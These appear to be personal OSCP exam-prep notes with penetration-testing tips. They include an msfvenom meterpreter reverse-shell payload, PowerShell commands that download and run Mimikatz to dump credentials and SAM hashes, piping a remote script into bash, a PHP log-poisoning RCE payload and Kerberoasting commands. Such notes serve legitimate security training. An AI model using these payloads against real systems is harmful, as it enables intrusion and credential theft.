---
description: Just some rough notes in preparation for the OSCP.
---

# OSCP Notes

### Quick Notes

* Transferring a file such as a .doc to a FTP share? Reminder to use `binary` before doing so or else it will upload as ASCII.&#x20;
* If LinPEAS doesn't return anything useful then it is possible you already have the information needed to privilege escalate. Try default passwords, [priv esc with fail2ban](https://grumpygeekwrites.wordpress.com/2021/01/29/privilege-escalation-via-fail2ban/), and other common tricks.
  * For priv esc with fail2ban, use a netcat shell or modify the permissions of `/etc/shadow`
* When enumerating FTP, ensure you run `dir -a` to enumerate any hidden files or directories on the system. You may find l00t!
* Ensure you run FeroxBuster or GoBuster with file extensions identified throughout inital enumeration of the device.
* Always try to login with default passwords and with using the username as a password. For example, if a username has been identiifed as `parzival` try and login with the password `parzival`
* If you have a shell via Netcat on a Windows machine, try using Curl to download a  ps1 to the target and executing it.
  * `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f psh -o meterpreter-64.ps1`
* Metasploit and Meterpreter are only allowed against one machine in the exam so ensure that you are sure before executing. There may be other ways to accomplish what you want (e.g., CrackMapExec, Lsassy, etc).&#x20;
* PowerShell Empire has some great PS1 scripts readily available such as `Invoke-Watson` and `Invoke-MS16032` as examples. These can be accessed at `/usr/share/powershell-empire/empire/server/modules/`
* Unable to get Mimikatz onto a machine? Simply host a http server and execute the following:
  * `powershell IEX (New-Object System.Net.Webclient).DownloadString('http://10.10.10.1:8080/Invoke-Mimikatz.ps1') ; Invoke-Mimikatz -DumpCreds`&#x20;
  * `powershell IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.119.164:8080/Invoke-Mimikatz.ps1') ; Invoke-Mimikatz -Command lsadump::sam`
* If you are getting the following message `You are not a search engine. Permission denied.` when attempting to browse to robots.txt then set your user agent in Burp to the following:&#x20;
  * `User-Agent: Googlebot/2.1 (+http://www.googlebot.com/bot.html)`
* If a login page default password doesn't work then think of what a lazy admin would use (uppercase and lowercase). CeWL can be used here if you're running out of ideas.
* If there are no writable directories then just pipe LinPEAS (or other tool of choice) directly into bash:
  * `curl 10.10.10.1:8080/linpeas.sh | bash`
* **REMEMBER KISS - Keep It Super Simple**. Several times I have tried to do something overly complicated when the first thing I would have tried would work.
* Oracle SQLi - [This link](http://www.securityidiots.com/Web-Pentest/SQL-Injection/Union-based-Oracle-Injection.html) is beyond useful. Got me out of a situation where I was extremely stuck.&#x20;
* Mimikatz errors? Need to downgrade your version? Use the version availabke at [this link](https://gitlab.com/kalilinux/packages/mimikatz/-/tree/d72fc2cca1df23f60f81bc141095f65a131fd099/).
* If testing for Shellshock on SMTP then I have found[ this exploit ](https://github.com/3mrgnc3/pentest\_old/blob/master/postfix-shellshock-nc.py)to be the most reliable. It requires a valid email address so ensure you run `VRFY` to enumerate a valid email prior to execution.
* If you can access the Apache logs through LFI and observe the 'User Agent' is viewable, we can potentially specify our user agent to PHP code and execute that on the target machine. [This video from John Hammond](https://www.youtube.com/watch?v=u\_uuk7FWWF4) is a great example.
  * Using this we can potentially turn an LFI into RCE. An example user agent would be the following: `User-Agent: <?php system(\$_GET['c']); ?>`
* Log into the SMTP server to identify the version if it is not returned in the Nmap scan. Identifying Postfix means that multiple exploits from Searchsploit may work: `searchsploit postfix`
* You can perform post exploitation activities such as Kerberoasting with a machine account. This may be important if you cannot find another path to exploitation:

`GetUserSPNs.py -request 'DOMAIN/MACHINE$' -dc-ip DC -hashes 'LM:NTLM'`

* PowerView is your best friend when attempting to pivot. Run the following commands to get the lay of the land and perform exploitation activities:

**Get Domain Users**

`Get-NetUser * -Domain corp.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset, lastlogontimestamp,accountexpires,admincount,userprincipalname, serviceprincipalname, mail,useraccountcontrol | Export-CSV users.csv`

#### Get Domain Computers

`Get-NetComputer * -Domain corp.local | Select-Object -Property dnshostname,operatingsystem,operatingsystemservicepack,lastlogontimestamp | Export-CSV computers.csv`

#### SPN Ticket Request

`Get-DomainUser * -SPN | Get-DomainSPNTicket -OutputFormat Hashcat | Export-Csv .\ticket.csv -NoTypeInformation`

### Helpful Blogs

* [List of Kerberos attacks with different tooling](https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a)

### Helpful OSCP Cheatsheets

* [OSCP Enumeration Cheatsheet](https://strongcourage.github.io/2020/05/03/enum.html)
* [iRedTeam Cheatsheet](https://www.ired.team/offensive-security-experiments/offensive-security-cheetsheets)

References While Building my Notes

* [FareedFauzi's Notes](https://fareedfauzi.gitbook.io/oscp-notes/others/active-directory-attack)
* [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/pass-the-hash-with-machine-accounts](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/pass-the-hash-with-machine-accounts)
